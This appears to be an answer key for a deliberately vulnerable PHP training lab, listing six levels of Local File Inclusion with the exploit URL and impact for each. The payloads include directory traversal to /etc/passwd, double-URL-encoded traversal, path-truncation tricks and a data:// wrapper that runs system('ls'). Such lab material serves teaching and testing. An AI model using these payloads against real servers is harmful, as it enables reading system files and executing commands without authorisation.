## Level 1

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level_1.php?file=/etc/passwd`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. 

## Level 2

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level_2.php?file=...//index`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. The string replacement here is unsufficient because you can still change directories.

## Level 3

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level_3.php?file=../../../etc/passwd`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. We can still change directories.


## Level 4

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level_4.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. The urldecode() call is risky and should not be called with $\_GET or $\_REQUEST (see [PHP documentation](https://www.php.net/manual/fr/function.urldecode.php)).

## Level 5

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level_5.php?file=data://text/plain;charset=utf-8,<?php system('ls');//index`

**Impact (with allow_url_include=On):** Execute arbitrary system commands on HTTP server. 


## Level 6

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level_6.php?file=./uploads_eede.php/../../../../../../../etc/passwd`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. We can still change directories.
